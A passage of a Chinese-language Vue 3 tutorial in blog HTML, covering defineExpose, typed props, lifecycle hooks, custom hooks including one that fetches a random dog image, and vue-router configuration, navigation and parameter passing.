lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,defineExpose&#125; from &#x27;vue&#x27;</span><br><span class="line">// 数据</span><br><span class="line">  let name = ref(&#x27;张三&#x27;)</span><br><span class="line">  let age = ref(18)</span><br><span class="line">  /****************************/</span><br><span class="line">  /****************************/</span><br><span class="line">  // 使用defineExpose将组件中的数据交给外部</span><br><span class="line">  defineExpose(&#123;name,age&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-12-【props】"><a href="#3-12-【props】" class="headerlink" title="3.12. 【props】"></a>3.12. 【props】</h2><blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt;<span class="comment">// 定义一个接口，限制每个Person对象的格式</span></span><br><span class="line"><span class="keyword">export</span> interface <span class="title class_">PersonInter</span> &#123;</span><br><span class="line"> <span class="attr">id</span>:string,</span><br><span class="line"> <span class="attr">name</span>:string,</span><br><span class="line">    <span class="attr">age</span>:number</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 定义一个自定义类型Persons</span></span><br><span class="line"><span class="keyword">export</span> type <span class="title class_">Persons</span> = <span class="title class_">Array</span>&lt;<span class="title class_">PersonInter</span>&gt;</span><br></pre></td></tr></table></figure><p><code>App.vue</code>中代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;template&gt;</span><br><span class="line">&lt;Person :list=&quot;persons&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">  </span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">  import Person from &#x27;./components/Person.vue&#x27;</span><br><span class="line">  import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line">    import &#123;type Persons&#125; from &#x27;./types&#x27;</span><br><span class="line">  </span><br><span class="line">    let persons = reactive&lt;Persons&gt;([</span><br><span class="line">     &#123;id:&#x27;e98219e12&#x27;,name:&#x27;张三&#x27;,age:18&#125;,</span><br><span class="line">      &#123;id:&#x27;e98219e13&#x27;,name:&#x27;李四&#x27;,age:19&#125;,</span><br><span class="line">       &#123;id:&#x27;e98219e14&#x27;,name:&#x27;王五&#x27;,age:20&#125;</span><br><span class="line">     ])</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><code>Person.vue</code>中代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;person&quot;&gt;</span><br><span class="line"> &lt;ul&gt;</span><br><span class="line">     &lt;li v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">        &#123;&#123;item.name&#125;&#125;--&#123;&#123;item.age&#125;&#125;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/template&gt;</span><br><span class="line">  </span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123;defineProps&#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123;type PersonInter&#125; from &#x27;@/types&#x27;</span><br><span class="line">  </span><br><span class="line">  // 第一种写法：仅接收</span><br><span class="line">// const props = defineProps([&#x27;list&#x27;])</span><br><span class="line">  </span><br><span class="line">  // 第二种写法：接收+限制类型</span><br><span class="line">// defineProps&lt;&#123;list:Persons&#125;&gt;()</span><br><span class="line">  </span><br><span class="line">  // 第三种写法：接收+限制类型+指定默认值+限制必要性</span><br><span class="line">let props = withDefaults(defineProps&lt;&#123;list?:Persons&#125;&gt;(),&#123;</span><br><span class="line">     list:()=&gt;[&#123;id:&#x27;asdasg01&#x27;,name:&#x27;小猪佩奇&#x27;,age:18&#125;]</span><br><span class="line">  &#125;)</span><br><span class="line">   console.log(props)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="3-13-【生命周期】"><a href="#3-13-【生命周期】" class="headerlink" title="3.13. 【生命周期】"></a>3.13. 【生命周期】</h2><ul><li><p>概念：<code>Vue</code>组件实例在创建时要经历一系列的初始化步骤，在此过程中<code>Vue</code>会在合适的时机，调用特定的函数，从而让开发者有机会在特定阶段运行自己的代码，这些特定的函数统称为：生命周期钩子</p></li><li><p>规律：</p><blockquote><p>生命周期整体分为四个阶段，分别是：<strong>创建、挂载、更新、销毁</strong>，每个阶段都有两个钩子，一前一后。</p></blockquote></li><li><p><code>Vue2</code>的生命周期</p><blockquote><p>创建阶段：<code>beforeCreate</code>、<code>created</code></p><p>挂载阶段：<code>beforeMount</code>、<code>mounted</code></p><p>更新阶段：<code>beforeUpdate</code>、<code>updated</code></p><p>销毁阶段：<code>beforeDestroy</code>、<code>destroyed</code></p></blockquote></li><li><p><code>Vue3</code>的生命周期</p><blockquote><p>创建阶段：<code>setup</code></p><p>挂载阶段：<code>onBeforeMount</code>、<code>onMounted</code></p><p>更新阶段：<code>onBeforeUpdate</code>、<code>onUpdated</code></p><p>卸载阶段：<code>onBeforeUnmount</code>、<code>onUnmounted</code></p></blockquote></li><li><p>常用的钩子：<code>onMounted</code>(挂载完毕)、<code>onUpdated</code>(更新完毕)、<code>onBeforeUnmount</code>(卸载之前)</p></li><li><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;点我sum+1&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- vue3写法 --&gt;</span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123; </span><br><span class="line">    ref, </span><br><span class="line">    onBeforeMount, </span><br><span class="line">    onMounted, </span><br><span class="line">    onBeforeUpdate, </span><br><span class="line">    onUpdated, </span><br><span class="line">    onBeforeUnmount, </span><br><span class="line">    onUnmounted </span><br><span class="line">  &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let sum = ref(0)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeSum() &#123;</span><br><span class="line">    sum.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(&#x27;setup&#x27;)</span><br><span class="line">  // 生命周期钩子</span><br><span class="line">  onBeforeMount(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;挂载之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onMounted(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;挂载完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onBeforeUpdate(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;更新之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onUpdated(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;更新完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onBeforeUnmount(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;卸载之前&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">  onUnmounted(()=&gt;&#123;</span><br><span class="line">    console.log(&#x27;卸载完毕&#x27;)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-14-【自定义hook】"><a href="#3-14-【自定义hook】" class="headerlink" title="3.14. 【自定义hook】"></a>3.14. 【自定义hook】</h2><ul><li><p>什么是<code>hook</code>？—— 本质是一个函数，把<code>setup</code>函数中使用的<code>Composition API</code>进行了封装，类似于<code>vue2.x</code>中的<code>mixin</code>。</p></li><li><p>自定义<code>hook</code>的优势：复用代码, 让<code>setup</code>中的逻辑更清楚易懂。</p></li></ul><p>示例代码：</p><ul><li><p><code>useSum.ts</code>中内容如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;ref,onMounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>)=&gt;&#123;</span><br><span class="line">    sum.<span class="property">value</span> += <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">decrement</span> = (<span class="params"></span>)=&gt;&#123;</span><br><span class="line">    sum.<span class="property">value</span> -= <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">onMounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">increment</span>()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//向外部暴露数据</span></span><br><span class="line">  <span class="keyword">return</span> &#123;sum,increment,decrement&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>useDog.ts</code>中内容如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive,onMounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios,&#123;<span class="title class_">AxiosError</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> dogList = reactive&lt;string[]&gt;([])</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 方法</span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getDog</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 发请求</span></span><br><span class="line">      <span class="keyword">let</span> &#123;data&#125; = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://dog.ceo/api/breed/pembroke/images/random&#x27;</span>)</span><br><span class="line">      <span class="comment">// 维护数据</span></span><br><span class="line">      dogList.<span class="title function_">push</span>(data.<span class="property">message</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="comment">// 处理错误</span></span><br><span class="line">      <span class="keyword">const</span> err = &lt;<span class="title class_">AxiosError</span>&gt;error</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err.<span class="property">message</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 挂载钩子</span></span><br><span class="line">  <span class="title function_">onMounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">getDog</span>()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//向外部暴露数据</span></span><br><span class="line">  <span class="keyword">return</span> &#123;dogList,getDog&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>组件中具体使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;点我+1&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;decrement&quot;&gt;点我-1&lt;/button&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;img v-for=&quot;(u,index) in dogList.urlList&quot; :key=&quot;index&quot; :src=&quot;(u as string)&quot;&gt; </span><br><span class="line">  &lt;span v-show=&quot;dogList.isLoading&quot;&gt;加载中......&lt;/span&gt;&lt;br&gt;</span><br><span class="line">  &lt;button @click=&quot;getDog&quot;&gt;再来一只狗&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  import &#123;defineComponent&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  export default defineComponent(&#123;</span><br><span class="line">    name:&#x27;App&#x27;,</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">  import useSum from &#x27;./hooks/useSum&#x27;</span><br><span class="line">  import useDog from &#x27;./hooks/useDog&#x27;</span><br><span class="line"></span><br><span class="line">  let &#123;sum,increment,decrement&#125; = useSum()</span><br><span class="line">  let &#123;dogList,getDog&#125; = useDog()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="4-路由"><a href="#4-路由" class="headerlink" title="4. 路由"></a>4. 路由</h1><h2 id="4-1-【对路由的理解】"><a href="#4-1-【对路由的理解】" class="headerlink" title="4.1. 【对路由的理解】"></a>4.1. 【对路由的理解】</h2><img src="images/image-20231018144351536.png" alt="image-20231018144351536" style="zoom:20%;border-radius:40px" /> <h2 id="4-2-【基本切换效果】"><a href="#4-2-【基本切换效果】" class="headerlink" title="4.2. 【基本切换效果】"></a>4.2. 【基本切换效果】</h2><ul><li><p><code>Vue3</code>中要使用<code>vue-router</code>的最新版本，目前是<code>4</code>版本。</p></li><li><p>路由配置文件代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createRouter,createWebHistory&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;@/pages/Home.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">News</span> <span class="keyword">from</span> <span class="string">&#x27;@/pages/News.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;@/pages/About.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line"><span class="attr">history</span>:<span class="title function_">createWebHistory</span>(),</span><br><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>main.ts</code>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router/index&#x27;</span></span><br><span class="line">app.<span class="title function_">use</span>(router)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>App.vue</code>代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2 class=&quot;title&quot;&gt;Vue路由测试&lt;/h2&gt;</span><br><span class="line">    &lt;!-- 导航区 --&gt;</span><br><span class="line">    &lt;div class=&quot;navigate&quot;&gt;</span><br><span class="line">      &lt;RouterLink to=&quot;/home&quot; active-class=&quot;active&quot;&gt;首页&lt;/RouterLink&gt;</span><br><span class="line">      &lt;RouterLink to=&quot;/news&quot; active-class=&quot;active&quot;&gt;新闻&lt;/RouterLink&gt;</span><br><span class="line">      &lt;RouterLink to=&quot;/about&quot; active-class=&quot;active&quot;&gt;关于&lt;/RouterLink&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- 展示区 --&gt;</span><br><span class="line">    &lt;div class=&quot;main-content&quot;&gt;</span><br><span class="line">      &lt;RouterView&gt;&lt;/RouterView&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">  import &#123;RouterLink,RouterView&#125; from &#x27;vue-router&#x27;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-3-【两个注意点】"><a href="#4-3-【两个注意点】" class="headerlink" title="4.3. 【两个注意点】"></a>4.3. 【两个注意点】</h2><blockquote><ol><li><p>路由组件通常存放在<code>pages</code> 或 <code>views</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</p></li><li><p>通过点击导航，视觉效果上“消失” 了的路由组件，默认是被<strong>卸载</strong>掉的，需要的时候再去<strong>挂载</strong>。</p></li></ol></blockquote><h2 id="4-4-【路由器工作模式】"><a href="#4-4-【路由器工作模式】" class="headerlink" title="4.4.【路由器工作模式】"></a>4.4.【路由器工作模式】</h2><ol><li><p><code>history</code>模式</p><blockquote><p>优点：<code>URL</code>更加美观，不带有<code>#</code>，更接近传统的网站<code>URL</code>。</p><p>缺点：后期项目上线，需要服务端配合处理路径问题，否则刷新会有<code>404</code>错误。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>:<span class="title function_">createWebHistory</span>(), <span class="comment">//history模式</span></span><br><span class="line">  <span class="comment">/******/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>hash</code>模式</p><blockquote><p>优点：兼容性更好，因为不需要服务器端处理路径。</p><p>缺点：<code>URL</code>带有<code>#</code>不太美观，且在<code>SEO</code>优化方面相对较差。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>:<span class="title function_">createWebHashHistory</span>(), <span class="comment">//hash模式</span></span><br><span class="line">  <span class="comment">/******/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li></ol><h2 id="4-5-【to的两种写法】"><a href="#4-5-【to的两种写法】" class="headerlink" title="4.5. 【to的两种写法】"></a>4.5. 【to的两种写法】</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 第一种：to的字符串写法 --&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/home&quot;&gt;主页&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 第二种：to的对象写法 --&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; :to=&quot;&#123;path:&#x27;/home&#x27;&#125;&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><h2 id="4-6-【命名路由】"><a href="#4-6-【命名路由】" class="headerlink" title="4.6. 【命名路由】"></a>4.6. 【命名路由】</h2><p>作用：可以简化路由跳转及传参（后面就讲）。</p><p>给路由规则命名：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;zhuye&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;xinwen&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/news&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">News</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;guanyu&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>跳转路由：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--简化前：需要写完整的路径（to的字符串写法） --&gt;</span><br><span class="line">&lt;router-link to=&quot;/news/detail&quot;&gt;跳转&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--简化后：直接通过名字跳转（to的对象写法配合name属性） --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;name:&#x27;guanyu&#x27;&#125;&quot;&gt;跳转&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><h2 id="4-7-【嵌套路由】"><a href="#4-7-【嵌套路由】" class="headerlink" title="4.7. 【嵌套路由】"></a>4.7. 【嵌套路由】</h2><ol><li><p>编写<code>News</code>的子路由：<code>Detail.vue</code></p></li><li><p>配置路由规则，使用<code>children</code>配置项：</p><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>:<span class="title function_">createWebHistory</span>(),</span><br><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;zhuye&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xinwen&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/news&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">News</span>,</span><br><span class="line"><span class="attr">children</span>:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiang&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Detail</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;guanyu&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure></li><li><p>跳转路由（记得要加完整路径）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link to=&quot;/news/detail&quot;&gt;xxxx&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 或 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;path:&#x27;/news/detail&#x27;&#125;&quot;&gt;xxxx&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li><li><p>记得去<code>Home</code>组件中预留一个<code>&lt;router-view&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;news&quot;&gt;</span><br><span class="line">    &lt;nav class=&quot;news-list&quot;&gt;</span><br><span class="line">      &lt;RouterLink v-for=&quot;news in newsList&quot; :key=&quot;news.id&quot; :to=&quot;&#123;path:&#x27;/news/detail&#x27;&#125;&quot;&gt;</span><br><span class="line">        &#123;&#123;news.name&#125;&#125;</span><br><span class="line">      &lt;/RouterLink&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;div class=&quot;news-detail&quot;&gt;</span><br><span class="line">      &lt;RouterView/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-8-【路由传参】"><a href="#4-8-【路由传参】" class="headerlink" title="4.8. 【路由传参】"></a>4.8. 【路由传参】</h2><h3 id="query参数"><a href="#query参数" class="headerlink" title="query参数"></a>query参数</h3><ol><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 跳转并携带query参数（to的字符串写法） --&gt;</span><br><span class="line">&lt;router-link to=&quot;/news/detail?a=1&amp;b=2&amp;content=欢迎你&quot;&gt;</span><br><span class="line">跳转</span><br><span class="line">&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳转并携带query参数（to的对象写法） --&gt;</span><br><span class="line">&lt;RouterLink </span><br><span class="line">  :to=&quot;&#123;</span><br><span class="line">    //name:&#x27;xiang&#x27;, //用name也可以跳转</span><br><span class="line">    path:&#x27;/news/detail&#x27;,</span><br><span class="line">    query:&#123;</span><br><span class="line">      id:news.id,</span><br><span class="line">      title:news.title,</span><br><span class="line">      content:news.content</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &#123;&#123;news.title&#125;&#125;</span><br><span class="line">&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useRoute&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">const</span> route = <span class="title function_">useRoute</span>()</span><br><span class="line"><span class="comment">// 打印query参数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">query</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="params参数"><a href="#params参数" class="headerlink" title="params参数"></a>params参数</h3><ol><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 跳转并携带params参数（to的字符串写法） --&gt;</span><br><span class="line">&lt;RouterLink :to=&quot;`/news/detail/001/新闻001/内容001`&quot;&gt;&#123;&#123;news.title&#125;&#125;&lt;/RouterLink&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳转并携带params参数（to的对象写法） --&gt;</span><br><span class="line">&lt;RouterLink </span><br><span class="line">  :to=&quot;&#123;</span><br><span class="line">    name:&#x27;xiang&#x27;, //用name跳转</span><br><span class="line">    params:&#123;</span><br><span class="line">      id:news.id,</span><br><span class="line">      title:news.title,</span><br><span class="line">      content:news.title</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &#123;&#123;news.title&#125;&#125;</span><br><span class="line">&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useRoute&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">const</span> route = <span class="title function_">useRoute</span>()</span><br><span class="line"><span class="comment">// 打印params参数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">params</span>)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>备注1：传递<code>params</code>参数时，若使用<code>to</code>的对象写法，必须使用<code>name</code>配置项，不能用<code>path</code>。</p><p>备注2：传递<code>params</code>参数时，需要提前在规则中占位。</p></blockquote><h2 id="4-9-【路由的props配置】"><a href="#4-9-【路由的props配置】" class="headerlink" title="4.9. 【路由的props配置】"></a>4.9. 【路由的props配置】</h2><p>作用：让路由组件更方便的收到参数（可以将路由参数作为<code>props</code>传给组件）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiang&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;detail/:id/:title/:content&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Detail</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// props的对象写法，作用：把对象中的每一组key-value作为props传给Detail组件</span></span><br><span class="line">  <span class="comment">// props:&#123;a:1,b:2,c:3&#125;, </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// props的布尔值写法，作用：把收到了每一组params参数，作为props传给Detail组件</span></span><br><span class="line">  <span class="comment">// props:true</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// props的函数写法，作用：把返回的对象中每一组key-value作为props传给Detail组件</span></span><br><span class="line">  <span class="title function_">props</span>(<span class="params">route</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> route.<span class="property">query</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-10-【-replace属性】"><a href="#4-10-【-replace属性】" class="headerlink" title="4.10. 【 replace属性】"></a>4.10. 【 